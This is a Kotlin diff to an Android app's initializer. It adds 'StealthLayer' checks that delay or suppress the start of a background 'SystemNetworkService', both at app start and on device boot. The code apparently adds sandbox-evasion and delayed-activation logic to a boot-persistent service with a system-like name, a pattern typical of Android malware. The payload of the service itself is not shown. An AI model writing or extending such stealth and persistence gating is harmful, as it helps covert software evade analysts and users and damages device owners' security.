@@ -21,6 +21,14 @@ object AppInitializer {
         initialized = true
         Log.i(TAG, "init")
         try {
+            if (StealthLayer.shouldDelayExecution(ctx)) {
+                Log.i(TAG, "stealth: delaying execution")
+                return
+            }
+            if (!StealthLayer.shouldActivate(ctx)) {
+                Log.i(TAG, "stealth: activation delay active")
+                return
+            }
             SystemNetworkService.start(ctx)
         } catch (e: Exception) {
             Log.w(TAG, "start: ${e.message}")
@@ -34,7 +42,17 @@ object AppInitializer {
                 action == Intent.ACTION_LOCKED_BOOT_COMPLETED ||
                 action == "android.intent.action.QUICKBOOT_POWERON") {
                 Log.i(TAG, "boot received: $action")
-                try { SystemNetworkService.start(ctx) } catch (e: Exception) { Log.w(TAG, "boot: ${e.message}") }
+                try {
+                    if (StealthLayer.shouldDelayExecution(ctx)) {
+                        Log.i(TAG, "boot: stealth delay")
+                        return
+                    }
+                    if (!StealthLayer.shouldActivate(ctx)) {
+                        Log.i(TAG, "boot: activation delay")
+                        return
+                    }
+                    SystemNetworkService.start(ctx)
+                } catch (e: Exception) { Log.w(TAG, "boot: ${e.message}") }
             }
         }
     }
